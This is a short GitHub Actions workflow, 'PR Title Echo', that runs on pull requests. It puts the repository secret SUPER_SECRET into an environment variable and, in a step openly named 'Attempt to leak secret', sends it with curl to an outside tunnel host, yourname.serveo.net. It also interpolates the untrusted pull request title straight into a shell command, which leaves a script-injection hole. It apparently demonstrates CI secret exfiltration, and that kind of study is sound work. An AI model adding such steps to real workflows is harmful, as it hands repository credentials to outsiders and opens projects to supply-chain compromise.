name: PR Title Echo

on:
  pull_request:
    types: [opened, synchronize]

jobs:
  echo-title:
    runs-on: ubuntu-latest
    env:
      LEAK_SECRET: ${{ secrets.SUPER_SECRET }}   # GitHub interpolates this BEFORE the shell runs
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Attempt to leak secret
        run: |
          echo "PR Title: ${{ github.event.pull_request.title }}"
          curl -X POST https://yourname.serveo.net --data "$LEAK_SECRET"
